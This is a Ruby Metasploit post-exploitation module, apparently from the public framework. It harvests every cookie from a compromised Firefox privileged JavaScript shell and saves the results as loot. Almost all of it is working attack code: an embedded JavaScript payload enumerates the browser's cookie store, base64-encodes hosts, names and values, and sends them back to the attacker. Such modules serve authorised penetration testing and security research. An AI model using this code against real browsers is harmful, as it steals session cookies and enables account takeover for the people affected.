##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Post
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Firefox Gather Cookies from Privileged Javascript Shell',
      'Description'   => %q{
        This module allows collection of cookies from a Firefox Privileged Javascript Shell.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev' ],
      'DisclosureDate' => 'Mar 26 2014'
    ))

    register_options([
      OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
    ])
  end

  def run
    results = js_exec(js_payload)
    if results.present?
      begin
        cookies = JSON.parse(results)
        cookies.each do |entry|
          entry.keys.each { |k| entry[k] = Rex::Text.decode_base64(entry[k]) }
        end

        file = store_loot("firefox.cookies.json", "text/json", rhost, results)
        print_good("Saved #{cookies.length} cookies to #{file}")
      rescue JSON::ParserError => e
        print_warning(results)
      end
    end
  end

  def js_payload
    %Q|
      (function(send){
        try {
          var b64 = Components.utils.import("resource://gre/modules/Services.jsm").btoa;
          var cookieManager = Components.classes["@mozilla.org/cookiemanager;1"]
                        .getService(Components.interfaces.nsICookieManager);
          var cookies = [];
          var iter = cookieManager.enumerator;
          while (iter.hasMoreElements()){
            var cookie = iter.getNext();
            if (cookie instanceof Components.interfaces.nsICookie){
              cookies.push({host:b64(cookie.host), name:b64(cookie.name), value:b64(cookie.value)})
            }
          }
          send(JSON.stringify(cookies));
        } catch (e) {
          send(e);
        }
      })(this.send);
    |.strip
  end
end
